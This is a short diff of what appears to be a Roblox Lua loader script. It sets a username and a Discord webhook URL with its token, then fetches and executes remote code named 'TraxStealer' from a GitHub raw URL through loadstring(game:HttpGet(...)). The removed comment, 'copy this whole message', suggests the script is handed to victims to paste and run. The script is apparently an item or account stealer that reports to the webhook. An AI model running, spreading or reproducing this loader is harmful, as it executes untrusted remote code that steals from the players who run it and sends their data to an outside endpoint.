@@ -1,4 +1,4 @@
 Username = "flyboytrist83"
 Webhook = "https://discord.com/api/webhooks/1358712007989133514/uRb5odYTuXLQFDcgfOC84fiSxr8XSpmXfR_JGIEBNuoRGQ5HiFEboy3Z-dD8swypk2gv"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/PlsDonate/refs/heads/main/TraxStealer"))() -- copy this whole message
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/PlsDonate/refs/heads/main/TraxStealer"))()
